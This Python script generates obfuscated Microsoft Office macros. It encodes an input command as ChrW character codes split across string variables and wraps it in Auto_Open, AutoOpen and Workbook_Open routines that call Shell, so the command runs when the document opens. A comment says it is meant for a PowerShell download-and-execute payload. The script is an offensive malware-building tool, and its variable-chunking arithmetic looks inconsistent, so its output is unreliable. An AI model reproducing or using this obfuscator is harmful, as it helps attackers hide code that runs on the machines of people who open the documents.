# Macro Obfuscator for MS Office Macros
# based on CODESYNCED's obfuscation program (written in Java) 
import sys

# names for additional strings to store the obfuscated data in
# simple powershell download+execute should only need ~140 characters

varNames = ["first", "second", "third", "fourth", "fifth", "sixth", "seventh", \
            "eighth", "ninth", "tenth", "eleventh", "twelfth", "thirteenth", \
            "fourteenth", "fifteenth", "sixteenth", "seventeenth", "eighteenth"]

def usage():
    print "Usage: ", sys.argv[0], "<inputfile> <outputfile>"
    exit(1)
    
def do_obfuscate(inputText):
    obfuscated = "Sub Auto_Open()\n"
    fullLength = len(inputText)
    for index in range(fullLength / 10):
        obfuscated += "     Dim " + varNames[index] + " As String\n"
    obfuscated += "     Dim last as String\n"
    obfuscated += "     %s = " % varNames[0]
    for index in range(fullLength):
        obfuscated += "ChrW("
        obfuscated += "%d)" % ord(inputText[index])
        if index > 10 and (index % 11 == 0):
            # move on to the next variable
            obfuscated += "\n     %s = " % varNames[(index / 10)]
        elif index != (fullLength-1):
            obfuscated += " & "
    obfuscated += "\n     last = first"
    for index in range(1, (fullLength / 10)):
        obfuscated += " + %s" % varNames[index]
    obfuscated += "\n     Shell(last)\nEnd Sub\nSub AutoOpen()\n     Auto_Open\nEnd Sub\nSub Workbook_Open()\n"
    obfuscated += "     Auto_Open\nEnd Sub"
    return obfuscated



infile = open(sys.argv[1])
outfile = open(sys.argv[2], 'w')
inputText = infile.read()
outputText = do_obfuscate(inputText)
outfile.write(outputText)